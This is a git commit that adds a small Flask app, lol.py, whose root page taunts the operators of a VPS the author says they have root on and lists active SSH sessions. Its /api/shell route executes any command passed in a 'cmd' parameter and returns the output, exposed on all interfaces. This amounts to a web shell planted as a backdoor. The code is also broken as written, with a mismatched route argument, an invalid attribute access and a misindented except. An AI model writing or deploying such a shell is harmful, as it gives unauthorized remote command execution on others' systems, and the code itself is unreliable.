d80096b316ee26aa6eb7c50bc75c4e787fe01bb5
Elliot Alderson <60684641+0x0elliot@users.noreply.github.com>
2021-01-19 01:27:04 +0530

    Create lol.py

---
+++ lol.py
@@ -0,0 +1,20 @@
+from flask import Flask, request
+import subprocess
+
+app=Flask(__name__)
+
+@app.route('/')
+def lol():
+  return f"<p>i love the initiative but me having root access to any system, even if it's a VPS is funny. Probably was intended but still come on security professionals.<br>Active SSH connections<br></p><center>{subprocess.check_output(["w"])}</center>"
+  
+@app.route('/api/shell/<command>')
+def shell():
+  try:
+    request.args.cmd
+    return f"{subprocess.check_output(request.args.get('cmd').split())}"
+   except:
+    return "use cmd parameter to execute commands"
+
+
+
+app.run(host="0.0.0.0", port=69)
